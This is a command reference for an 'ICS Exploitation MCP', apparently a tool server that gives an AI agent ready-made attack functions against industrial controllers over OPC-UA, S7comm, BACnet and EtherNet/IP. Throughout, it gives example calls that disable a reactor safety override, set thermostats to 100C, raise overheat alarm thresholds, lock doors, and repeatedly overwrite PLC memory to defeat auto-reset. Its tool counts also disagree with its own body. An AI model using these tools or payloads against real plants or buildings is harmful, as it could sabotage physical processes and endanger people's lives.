# ICS Exploitation MCP - Command Reference

Complete reference for all 58 tools in the ICS Exploitation MCP (v1.2.0).

## Protocol Coverage

| Protocol | Tools | Status |
|----------|-------|--------|
| General | 3 | Core utilities |
| OPC-UA | 11 | Validated |
| S7comm | 17 | Validated |
| BACnet | 10 | Validated |
| Modbus | 10 | Validated |
| EtherNet/IP | 8 | Validated |

---

## General Tools (3)

### ics_check_installation

Check installation status of all ICS protocols.

**Parameters**: None

**Returns**:
```json
{
  "mcp_name": "ics-exploitation-mcp",
  "version": "1.0.0",
  "protocols": {
    "opcua": {"available": true, "install": "pip install opcua cryptography"},
    "s7comm": {"available": true, "install": "pip install python-snap7"}
  },
  "any_protocol_ready": true
}
```

---

### ics_list_capabilities

List all available ICS exploitation tools.

**Parameters**: None

**Returns**: Tool list for each protocol with names and descriptions.

---

### ics_get_documentation

Get documentation for ICS protocols.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| protocol | string | No | "general" | Protocol: "general", "opcua", or "s7comm" |

---

## OPC-UA Tools (9)

### opcua_enumerate_endpoints

Discover OPC-UA server security requirements. **First step in OPC-UA exploitation.**

**Parameters**:
| Name | Type | Required | Description |
|------|------|----------|-------------|
| url | string | Yes | OPC-UA server URL (e.g., "opc.tcp://target:4840") |

**Returns**:
```json
{
  "url": "opc.tcp://target:4840",
  "endpoint_count": 4,
  "endpoints": [
    {"security_policy": "None", "security_mode": "None", "user_tokens": ["Anonymous"]},
    {"security_policy": "Basic256Sha256", "security_mode": "SignAndEncrypt", "user_tokens": ["Anonymous", "UserName"]}
  ],
  "security_policies": ["None", "Basic256Sha256"],
  "recommendation": "Server accepts 'None' security - use anonymous connection"
}
```

---

### opcua_generate_cert

Generate self-signed certificate for OPC-UA trust list bypass.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| output_dir | string | No | "." | Directory to save certificate files |

**Returns**:
```json
{
  "success": true,
  "cert_path": "/path/to/client_cert.pem",
  "key_path": "/path/to/client_key.pem",
  "thumbprint": "A1B2C3D4..."
}
```

---

### opcua_connect

Connect to OPC-UA server with specified security settings.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| url | string | Yes | - | OPC-UA server URL |
| cert_path | string | No | None | Path to client certificate (.pem) |
| key_path | string | No | None | Path to client private key (.pem) |
| security_policy | string | No | "None" | "None", "Basic128Rsa15", "Basic256", "Basic256Sha256" |
| security_mode | string | No | "None" | "None", "Sign", "SignAndEncrypt" |

**Example**:
```python
# Unencrypted
opcua_connect("opc.tcp://target:4840")

# Encrypted with self-signed cert
opcua_connect("opc.tcp://target:4840", 
              cert_path="./certs/client_cert.pem",
              key_path="./certs/client_key.pem",
              security_policy="Basic256Sha256",
              security_mode="SignAndEncrypt")
```

---

### opcua_disconnect

Disconnect from OPC-UA server.

**Parameters**: None

---

### opcua_enumerate_nodes

Enumerate OPC-UA node hierarchy with access level detection.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| max_depth | integer | No | 5 | Maximum recursion depth |

**Returns**:
```json
{
  "success": true,
  "total_count": 150,
  "writable_count": 12,
  "nodes": [
    {"node_id": "ns=2;i=1", "path": "Objects/...", "writable": true, "value": "100.5", "data_type": "Double"}
  ]
}
```

---

### opcua_find_writable

Find all writable variables (attack surface). Convenience wrapper around `opcua_enumerate_nodes`.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| max_depth | integer | No | 5 | Maximum recursion depth |

**Returns**:
```json
{
  "success": true,
  "count": 12,
  "variables": [
    {"node_id": "ns=2;i=38", "path": "Objects/Reactor/SafetyOverride", "value": "true", "data_type": "Boolean"}
  ],
  "attack_notes": "- Objects/Reactor/SafetyOverride (Boolean): Currently = true"
}
```

---

### opcua_get_node_info

Get detailed information about a specific OPC-UA node.

**Parameters**:
| Name | Type | Required | Description |
|------|------|----------|-------------|
| node_id | string | Yes | OPC-UA node ID (e.g., "ns=2;i=1") |

---

### opcua_read

Read an OPC-UA variable's current value.

**Parameters**:
| Name | Type | Required | Description |
|------|------|----------|-------------|
| node_id | string | Yes | OPC-UA node ID |

**Returns**:
```json
{
  "success": true,
  "node_id": "ns=2;i=11",
  "value": 75.5,
  "value_str": "75.5"
}
```

---

### opcua_write

Write a value to an OPC-UA variable.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| node_id | string | Yes | - | OPC-UA node ID |
| value | string | Yes | - | Value to write |
| data_type | string | No | "auto" | "auto", "Boolean", "Int16", "Int32", "UInt16", "UInt32", "Float", "Double", "String" |

**Example**:
```python
# Disable safety override
opcua_write("ns=2;i=38", "false", "Boolean")

# Set temperature to 0
opcua_write("ns=2;i=11", "0.0", "Double")
```

---

## S7comm Tools (17)

### s7_connect

Connect to Siemens S7 PLC. **Note: 4th parameter is TCP port.**

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| ip | string | Yes | - | Target IP address |
| rack | integer | No | 0 | PLC rack number (usually 0) |
| slot | integer | No | 0 | PLC slot number (0 for S7-300/1200/1500, 1 for S7-400) |
| port | integer | No | 102 | TCP port (some systems use non-standard ports) |

**Example**:
```python
# Standard port
s7_connect("192.168.1.1", rack=0, slot=0, port=102)

# Non-standard port
s7_connect("192.168.1.1", rack=0, slot=0, port=36815)
```

---

### s7_disconnect

Disconnect from S7 PLC.

**Parameters**: None

---

### s7_is_connected

Check if connected to S7 PLC.

**Parameters**: None

**Returns**:
```json
{
  "connected": true,
  "connection_info": {"ip": "192.168.1.1", "rack": 0, "slot": 0, "port": 102}
}
```

---

### s7_get_cpu_info

Get S7 CPU module information.

**Parameters**: None

**Returns**:
```json
{
  "success": true,
  "module_type": "CPU 315-2 PN/DP",
  "serial_number": "S V-X1234567890",
  "as_name": "",
  "module_name": ""
}
```

---

### s7_get_cpu_state

Get S7 CPU run state (Run/Stop).

**Parameters**: None

**Returns**:
```json
{
  "success": true,
  "state_code": 8,
  "state_name": "Run"
}
```

---

### s7_list_blocks

List all blocks on S7 PLC.

**Parameters**: None

**Returns**:
```json
{
  "success": true,
  "blocks": {"OB": 1, "FB": 0, "FC": 2, "SFB": 0, "SFC": 0, "DB": 3, "SDB": 0},
  "db_numbers": [1, 2, 3]
}
```

---

### s7_db_read

Read data from an S7 data block.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| db_number | integer | Yes | - | Data block number (e.g., 1 for DB1) |
| offset | integer | No | 0 | Byte offset to start reading |
| size | integer | No | 100 | Number of bytes to read |

**Returns**:
```json
{
  "success": true,
  "db_number": 1,
  "offset": 0,
  "size": 100,
  "data_hex": "00000000FF00...",
  "data_bytes": [0, 0, 0, 0, 255, 0, ...],
  "non_zero_bytes": [{"offset": 4, "value": "0xFF"}],
  "non_zero_count": 5
}
```

---

### s7_db_write

Write data to an S7 data block.

**Parameters**:
| Name | Type | Required | Description |
|------|------|----------|-------------|
| db_number | integer | Yes | Data block number |
| offset | integer | Yes | Byte offset to start writing |
| data | string | Yes | Data as hex string (e.g., "FF00FF00") |

**Example**:
```python
# Write 8 bytes of 0xFF
s7_db_write(db_number=1, offset=48, data="FF" * 8)

# Write specific bytes
s7_db_write(db_number=1, offset=0, data="00FF00FF")
```

---

### s7_db_get_size

Get the size of an S7 data block in bytes.

**Parameters**:
| Name | Type | Required | Description |
|------|------|----------|-------------|
| db_number | integer | Yes | Data block number |

**Returns**:
```json
{
  "success": true,
  "db_number": 1,
  "size": 256,
  "load_size": 270,
  "mc7_size": 256
}
```

---

### s7_read_area

Read from S7 memory area.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| area | string | Yes | - | Memory area: "DB", "PE", "PA", "MK", "CT", "TM" |
| db_number | integer | No | 0 | DB number (only for area="DB") |
| start | integer | No | 0 | Start byte offset |
| size | integer | No | 100 | Number of bytes to read |

**Area Codes**:
| Area | Description |
|------|-------------|
| DB | Data Blocks |
| PE | Process Inputs (sensors) |
| PA | Process Outputs (actuators) |
| MK | Markers |
| CT | Counters |
| TM | Timers |

---

### s7_write_area

Write to S7 memory area.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| area | string | Yes | - | Memory area: "DB", "PE", "PA", "MK" |
| db_number | integer | No | 0 | DB number (only for area="DB") |
| start | integer | No | 0 | Start byte offset |
| data | string | Yes | - | Data as hex string |

---

### s7_sustained_attack

Continuously write payload to maintain state. **Useful for systems where values auto-reset.**

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| db_number | integer | Yes | - | Data block number |
| offset | integer | Yes | - | Byte offset |
| data | string | Yes | - | Hex string payload |
| duration_seconds | integer | No | 60 | Duration in seconds |
| interval_ms | integer | No | 200 | Milliseconds between writes |
| status_url | string | No | None | Optional HMI URL to poll for status |

**Example**:
```python
s7_sustained_attack(
    db_number=1,
    offset=0,
    data="FF" * 128,
    duration_seconds=120,
    interval_ms=200,
    status_url="http://target:8080/status"
)
```

**Returns**:
```json
{
  "success": true,
  "writes_performed": 600,
  "write_errors": 0,
  "elapsed_seconds": 120.5,
  "status_history": [{"iteration": 0, "elapsed": 1.0, "status": {...}}]
}
```

---

### s7_sustained_attack_multi

Continuously write to multiple offsets to maintain state across multiple memory locations.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| db_number | integer | Yes | - | Data block number |
| writes | array | Yes | - | List of write operations: [{"offset": 32, "data": "00FF"}, ...] |
| duration_seconds | integer | No | 60 | Duration in seconds |
| interval_ms | integer | No | 200 | Milliseconds between write cycles |
| status_url | string | No | None | Optional HMI URL to poll for status |

**Example**:
```python
s7_sustained_attack_multi(
    db_number=1,
    writes=[
        {"offset": 0, "data": "FFFFFFFF"},
        {"offset": 32, "data": "00FF"},
        {"offset": 48, "data": "00FF"},
        {"offset": 64, "data": "FFFFFFFF"}
    ],
    duration_seconds=120,
    interval_ms=200,
    status_url="http://target:8080/status"
)
```

**Returns**:
```json
{
  "success": true,
  "writes_performed": 2400,
  "write_errors": 0,
  "write_count_per_cycle": 4,
  "elapsed_seconds": 120.5,
  "status_history": [{"iteration": 0, "elapsed": 1.0, "status": {...}}]
}
```

---

### s7_db_write_typed

Write value with proper S7 data type encoding. **Handles signed/unsigned conversion correctly to avoid integer wrap-around issues.**

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| db_number | integer | Yes | - | Data block number |
| offset | integer | Yes | - | Byte offset |
| value | any | Yes | - | Value to write |
| data_type | string | No | "BYTE" | S7 data type |

**Supported Data Types**:
| Type | Size | Range | Description |
|------|------|-------|-------------|
| BOOL | 1 byte | 0/1 | Boolean value |
| BYTE | 1 byte | 0-255 | Unsigned 8-bit |
| SINT | 1 byte | -128 to 127 | Signed 8-bit |
| INT | 2 bytes | -32768 to 32767 | Signed 16-bit big-endian |
| UINT | 2 bytes | 0-65535 | Unsigned 16-bit big-endian |
| DINT | 4 bytes | -2B to 2B | Signed 32-bit big-endian |
| UDINT | 4 bytes | 0-4B | Unsigned 32-bit big-endian |
| REAL | 4 bytes | float | 32-bit float big-endian |
| STRING | variable | - | S7 string format |

**Example**:
```python
# Write mixer speed as unsigned 16-bit (255)
s7_db_write_typed(db_number=1, offset=32, value=255, data_type="UINT")

# Write temperature as float
s7_db_write_typed(db_number=1, offset=48, value=100.5, data_type="REAL")

# Write boolean flag
s7_db_write_typed(db_number=1, offset=0, value=True, data_type="BOOL")
```

**Returns**:
```json
{
  "success": true,
  "db_number": 1,
  "offset": 32,
  "value": 255,
  "data_type": "UINT",
  "bytes_written": 2,
  "data_hex": "00FF"
}
```

---

### s7_monitor_status

Poll an HMI/API endpoint for status changes.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| status_url | string | Yes | - | URL to poll |
| interval_ms | integer | No | 500 | Polling interval |
| duration_seconds | integer | No | 30 | Monitor duration |

**Returns**:
```json
{
  "success": true,
  "polls_performed": 60,
  "initial_status": {...},
  "final_status": {...},
  "status_changes": [{"elapsed": 5.2, "changes": {"field": {"from": "a", "to": "b"}}}],
  "elapsed_seconds": 30.0
}
```

---

### s7_scan_db_effects

Systematically write to each byte offset and observe HMI changes. Maps memory to equipment.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| db_number | integer | Yes | - | Data block to scan |
| status_url | string | Yes | - | HMI URL to observe changes |
| start_offset | integer | No | 0 | Starting byte offset |
| end_offset | integer | No | 128 | Ending byte offset |
| test_value | string | No | "FF" | Hex value to write |

**Returns**:
```json
{
  "success": true,
  "offsets_tested": 128,
  "effects_found": {
    "48": {"temperature": {"baseline": 75.0, "after_write": 255.0}},
    "56": {"pressure": {"baseline": 100, "after_write": 255}}
  },
  "offset_map": {"48": ["temperature"], "56": ["pressure"]}
}
```

---

### s7_generate_payload

Generate common payload patterns for ICS testing.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| pattern | string | No | "all_max" | Pattern type |
| size | integer | No | 128 | Number of bytes |

**Pattern Types**:
| Pattern | Description |
|---------|-------------|
| all_max | 0xFF repeated (maximum values) |
| all_min | 0x00 repeated (minimum values) |
| all_mid | 0x80 repeated (mid values) |
| alternating | 0xFF00FF00... |
| incremental | 0x00, 0x01, 0x02... |
| random | Random bytes |

**Example**:
```python
payload = s7_generate_payload("all_max", 128)
# Returns: {"success": true, "payload": "FFFF..."}

s7_db_write(db_number=1, offset=0, data=payload['payload'])
```

---

## BACnet Tools (10)

BACnet (Building Automation and Control Networks) is used for HVAC, lighting, access control, and fire detection in building automation systems.

### bacnet_connect

Connect to BACnet CLI server.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| host | string | Yes | - | Target IP address |
| port | integer | Yes | - | BACnet CLI port |
| timeout | integer | No | 10 | Connection timeout in seconds |

**Returns**:
```json
{
  "success": true,
  "connected": true,
  "host": "192.168.1.1",
  "port": 48103,
  "banner": "1. objects\n2. bacnet.read\n3. bacnet.write"
}
```

---

### bacnet_disconnect

Disconnect from BACnet CLI server.

**Parameters**: None

**Returns**:
```json
{"success": true, "disconnected": true}
```

---

### bacnet_list_objects

List all BACnet objects (sensors, thermostats, alarms, doors).

**Parameters**: None

**Returns**:
```json
{
  "success": true,
  "objects": [
    {"raw": "Temp-L2-20 - analogInput:20 - Temperature sensor", "type_hint": "analogInput"},
    {"raw": "Therm-L2-21 - analogOutput:21 - Thermostat setpoint", "type_hint": "analogOutput"},
    {"raw": "OHAP-L2-23 - analogOutput:23 - Overheat Alarm Point", "type_hint": "analogOutput"}
  ],
  "object_count": 15
}
```

---

### bacnet_read

Read BACnet object property value.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| object_type | string | Yes | - | Object type (analogInput, analogOutput, etc.) |
| object_id | integer | Yes | - | Object instance ID |
| property | string | No | "presentValue" | Property name |

**Object Types**:
| Type | Description | Access |
|------|-------------|--------|
| analogInput | Sensor values (temperature) | Read-only |
| analogOutput | Setpoints (thermostat, alarms) | Read/Write |
| binaryInput | Status flags | Read-only |
| binaryOutput | Control switches (AC on/off) | Read/Write |
| multiStateInput | Multi-value status | Read-only |
| multiStateOutput | Multi-value control (door locks) | Read/Write |

**Example**:
```python
# Read current temperature
temp = bacnet_read(object_type="analogInput", object_id=20)
# Returns: {"success": true, "value": 19.5, "object_type": "analogInput", "object_id": 20}

# Read alarm threshold
ohap = bacnet_read(object_type="analogOutput", object_id=23)
# Returns: {"success": true, "value": 25.0, ...}
```

---

### bacnet_write

Write BACnet object property value.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| object_type | string | Yes | - | Object type (must be writable) |
| object_id | integer | Yes | - | Object instance ID |
| property | string | No | "presentValue" | Property name |
| value | any | Yes | - | Value to write |

**Example**:
```python
# Set thermostat to 100C
bacnet_write(object_type="analogOutput", object_id=21, value=100)

# Lock door (multiStateOutput: 1=unlocked, 2=locked)
bacnet_write(object_type="multiStateOutput", object_id=102, value=2)

# Raise alarm threshold to 200C
bacnet_write(object_type="analogOutput", object_id=23, value=200)
```

---

### bacnet_sustained_write

Continuously write a value to maintain state. Useful for systems with auto-reset mechanisms.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| object_type | string | Yes | - | Object type (e.g., "analogOutput") |
| object_id | integer | Yes | - | Object instance ID |
| property | string | No | "presentValue" | Property name |
| value | any | Yes | - | Value to write continuously |
| duration_seconds | integer | No | 120 | Duration in seconds |
| interval_seconds | number | No | 2.0 | Seconds between writes |
| status_url | string | No | null | HTTP endpoint to monitor for status |

**Returns**:
```json
{
  "success": true,
  "writes_performed": 60,
  "write_errors": 0,
  "elapsed_seconds": 120.5,
  "status_history": [{"elapsed": 2.0, "status": {...}}],
  "final_status": {...}
}
```

**Example**:
```python
result = bacnet_sustained_write(
    object_type="analogOutput",
    object_id=21,
    value=100,
    duration_seconds=120,
    interval_seconds=2.0,
    status_url="http://target:8080/data"
)
```

---

### bacnet_find_writable

Find all writable BACnet objects (attack surface).

**Parameters**: None

**Returns**:
```json
{
  "success": true,
  "writable_objects": [
    {"object_type": "analogOutput", "object_id": 21, "current_value": 19.0, "access": "read/write"},
    {"object_type": "binaryOutput", "object_id": 22, "current_value": 1, "access": "read/write"}
  ],
  "count": 8
}
```

---

### bacnet_write_multiple

Write to multiple BACnet objects in a batch.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| writes | array | Yes | - | List of write operations |

**Each write object**:
| Field | Type | Description |
|-------|------|-------------|
| object_type | string | Object type (e.g., "analogOutput") |
| object_id | integer | Object instance ID |
| property | string | Property name (default: "presentValue") |
| value | any | Value to write |

**Example**:
```python
bacnet_write_multiple(writes=[
    {"object_type": "analogOutput", "object_id": 21, "property": "presentValue", "value": 100},
    {"object_type": "analogOutput", "object_id": 22, "property": "presentValue", "value": 100},
    {"object_type": "binaryOutput", "object_id": 10, "property": "presentValue", "value": 1}
])
```

**Returns**:
```json
{
  "success": true,
  "results": [
    {"index": 0, "object_type": "analogOutput", "object_id": 21, "success": true},
    {"index": 1, "object_type": "analogOutput", "object_id": 22, "success": true}
  ],
  "success_count": 2,
  "total_count": 2
}
```

---

### bacnet_get_object_info

Get detailed information about a specific BACnet object.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| object_type | string | Yes | - | Object type |
| object_id | integer | Yes | - | Object instance ID |

**Returns**:
```json
{
  "object_type": "analogOutput",
  "object_id": 21,
  "presentValue": 19.0,
  "objectName": "Therm-L2-21",
  "description": "Level 2 Thermostat"
}
```

---

## EtherNet/IP Tools (8)

### ethernetip_connect

Connect to an EtherNet/IP controller using CIP protocol.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| host | string | Yes | - | Target IP address |
| port | integer | No | 44818 | EtherNet/IP port |

**Returns**:
```json
{
  "success": true,
  "connected": true,
  "host": "192.168.1.1",
  "port": 44818,
  "driver_type": "LogixDriver",
  "device_info": {
    "name": "1756-L61/B",
    "vendor": "Rockwell Automation",
    "product_type": "Programmable Logic Controller"
  }
}
```

**Example**:
```python
# Connect to Allen-Bradley controller
ethernetip_connect(host="192.168.1.1", port=44818)

# Connect on non-standard port
ethernetip_connect(host="target.local", port=41604)
```

---

### ethernetip_disconnect

Disconnect from the EtherNet/IP controller.

**Parameters**: None

**Returns**:
```json
{"success": true, "disconnected": true}
```

---

### ethernetip_get_identity

Get device identity information (vendor, product, serial number).

**Parameters**: None

**Returns**:
```json
{
  "success": true,
  "identity": {
    "name": "1756-L61/B",
    "vendor": "Rockwell Automation",
    "product_type": "Programmable Logic Controller",
    "product_name": "ControlLogix",
    "revision": "20.11",
    "serial": "12345678"
  }
}
```

---

### ethernetip_read_tag

Read a tag value from the PLC by name. Requires LogixDriver (Allen-Bradley).

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| tag_name | string | Yes | - | Name of tag to read |

**Returns**:
```json
{
  "success": true,
  "tag": "Status",
  "value": "example_value",
  "type": "STRING"
}
```

**Example**:
```python
# Read a string tag
ethernetip_read_tag(tag_name="Status")

# Read a numeric tag
ethernetip_read_tag(tag_name="Counter1")
```

---

### ethernetip_write_tag

Write a value to a PLC tag. Requires LogixDriver (Allen-Bradley).

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| tag_name | string | Yes | - | Name of tag to write |
| value | any | Yes | - | Value to write |

**Returns**:
```json
{
  "success": true,
  "tag": "SetPoint",
  "value": 100,
  "written": true
}
```

---

### ethernetip_list_tags

List all available tags on the PLC. Requires LogixDriver.

**Parameters**: None

**Returns**:
```json
{
  "success": true,
  "tag_count": 42,
  "tags": [
    {"name": "Status", "type": "STRING", "dim": null},
    {"name": "Counter1", "type": "DINT", "dim": null},
    {"name": "ArrayData", "type": "REAL", "dim": [10]}
  ]
}
```

---

### ethernetip_read_cip_object

Read from a CIP object using Get_Attributes_All or Get_Attribute_Single. Works with both LogixDriver and CIPDriver.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| class_id | integer | Yes | - | CIP class ID (e.g., 0x01=Identity, 0x02=Message Router) |
| instance | integer | Yes | - | Instance number (usually 1) |
| attribute | integer | No | null | Specific attribute (null = Get_Attributes_All) |

**Common CIP Classes**:
| Class | Hex | Description |
|-------|-----|-------------|
| Identity | 0x01 | Device identity information |
| Message Router | 0x02 | Message routing (often contains hidden data) |
| Assembly | 0x04 | I/O assemblies |
| Connection Manager | 0x06 | Connection management |
| Symbol | 0xAC | Tag/symbol information |

**Returns**:
```json
{
  "success": true,
  "class_id": "0x2",
  "instance": 1,
  "attribute": null,
  "raw_hex": "480054004200...",
  "raw_length": 200,
  "decoded": {
    "utf16_le": "sensitive_data_found"
  }
}
```

**Example**:
```python
# Read Message Router object (may contain sensitive data)
ethernetip_read_cip_object(class_id=0x02, instance=1)

# Read Identity object
ethernetip_read_cip_object(class_id=0x01, instance=1)

# Read specific attribute
ethernetip_read_cip_object(class_id=0x01, instance=1, attribute=7)
```

---

### ethernetip_enumerate_objects

Enumerate CIP objects to find interesting data. Scans common classes for accessible instances.

**Parameters**:
| Name | Type | Required | Default | Description |
|------|------|----------|---------|-------------|
| class_ids | array | No | [0x01, 0x02, 0x04, 0x06, 0xAC] | CIP classes to scan |
| max_instances | integer | No | 5 | Max instances per class |

**Returns**:
```json
{
  "success": true,
  "objects_found": 3,
  "results": [
    {
      "class_id": "0x1",
      "instance": 1,
      "raw_length": 64,
      "decoded": {"ascii": "ControlLogix"}
    },
    {
      "class_id": "0x2",
      "instance": 1,
      "raw_length": 200,
      "decoded": {"utf16_le": "sensitive_data_here"}
    }
  ]
}
```

**Example**:
```python
# Scan default CIP classes
ethernetip_enumerate_objects()

# Scan specific classes
ethernetip_enumerate_objects(class_ids=[0x01, 0x02], max_instances=10)
```

---

## Error Handling

All tools return structured responses with `success` field:

**Success**:
```json
{"success": true, "data": ...}
```

**Failure**:
```json
{"success": false, "error": "Error message", "hints": ["Possible solution 1", "Possible solution 2"]}
```

Common error hints are automatically provided for known issues.
